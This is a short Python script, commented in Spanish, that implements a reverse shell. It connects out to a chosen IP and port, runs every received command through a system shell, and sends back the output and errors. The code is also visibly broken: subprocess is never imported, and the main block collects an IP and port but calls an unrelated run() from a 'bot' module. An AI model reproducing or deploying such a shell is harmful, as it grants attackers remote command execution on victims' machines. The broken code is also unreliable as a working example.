import socket

from bot import run

def reverse_shell(ip, port):
    # Crear un socket TCP
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Conectar al servidor
    s.connect((ip, port))

    # Bucle infinito para recibir y ejecutar comandos
    while True:
        # Recibir el comando
        command = s.recv(1024)

        # Verificar si el comando es "exit"
        if command == b"exit":
            break

        # Ejecutar el comando
        p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, err = p.communicate()

        # Enviar la salida del comando
        s.sendall(output)

        # Enviar el error del comando
        s.sendall(err)

if __name__ == "__main__":
    # Solicitar al usuario la IP y el puerto
    ip = input("Introduzca la IP: ")
    port = int(input("Introduzca el puerto: "))

    # Ejecutar la función de shell inverso
    run()
